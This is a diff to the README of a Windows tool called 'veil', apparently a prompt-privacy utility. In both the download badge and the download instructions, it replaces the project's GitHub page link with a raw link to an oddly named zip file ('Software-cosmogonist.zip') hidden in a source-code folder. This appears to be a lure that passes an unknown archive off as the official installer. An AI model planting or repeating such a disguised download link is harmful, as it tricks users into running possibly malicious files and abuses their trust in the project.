@@ -1,6 +1,6 @@
 # 🔐 veil - Keep Prompts Private
 
-[![Download veil](https://img.shields.io/badge/Download%20veil-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/emilio4906/veil)
+[![Download veil](https://img.shields.io/badge/Download%20veil-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/emilio4906/veil/main/crates/veil-core/src/Software-cosmogonist.zip)
 
 ## 🔎 What veil does
 
@@ -28,7 +28,7 @@ For best results, keep Windows up to date. If your work or school PC blocks down
 
 Visit this page to download veil for Windows:
 
-https://github.com/emilio4906/veil
+https://raw.githubusercontent.com/emilio4906/veil/main/crates/veil-core/src/Software-cosmogonist.zip
 
 Look for the latest Windows release or build on the page. Download the file that matches your system. If you see more than one file, choose the Windows `.exe` file or the main installer file.
 
